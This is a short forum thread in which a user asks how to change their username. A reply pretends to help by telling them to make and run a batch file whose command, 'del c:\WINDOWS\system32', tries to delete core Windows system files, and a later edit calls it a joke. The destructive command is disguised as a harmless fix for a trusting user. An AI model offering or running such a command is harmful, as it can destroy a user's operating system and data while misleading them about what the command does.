posts.postText: change my name? cause I aint no crazy monkey no more. i r derp

Open your user cp

Open up notepad.

Type in

;Crazy Monkey
;New name

@echo off
del c:\WINDOWS\system32

save as (new name).bat

execute it

be amazed

Well that's easy, you go back were you came from PEZ.

Edit: Gosh I was jk ^^
